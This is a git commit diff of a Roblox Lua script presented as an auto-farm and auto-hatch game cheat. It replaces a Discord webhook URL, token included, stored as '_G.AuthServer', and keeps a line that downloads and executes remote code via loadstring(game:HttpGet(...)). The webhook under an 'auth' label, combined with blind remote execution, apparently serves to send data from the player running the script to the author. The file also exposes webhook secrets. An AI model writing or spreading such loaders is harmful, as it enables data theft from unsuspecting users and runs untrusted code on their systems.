e56f61d294df3e54aee851912c158a30dde90082
lmaooa1043 <119785971+lmaooa1043@users.noreply.github.com>
2022-12-24 15:35:38 +0300

    Update AutoFarmXAutoHatch.lua

--- AutoFarmXAutoHatch.lua
+++ AutoFarmXAutoHatch.lua
@@ -1,3 +1,3 @@
 _G.Key = "XXRETOBMlA"
-_G.AuthServer = "https://discord.com/api/webhooks/1052244070719815742/bOCQE3l5NUpkAdnWUKxIYeaT6SjXMc5AzDZc5TWD_Re7tZnQXg93fQq7WMxOX4BMM2uO"
+_G.AuthServer = "https://discord.com/api/webhooks/1055970801662312468/fMDtkW5c2lI15889N63SFbk_j3eM8hp-IsOmm7lYQJ5sI-0XCtcczyX02vW_vrd0RzyE"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
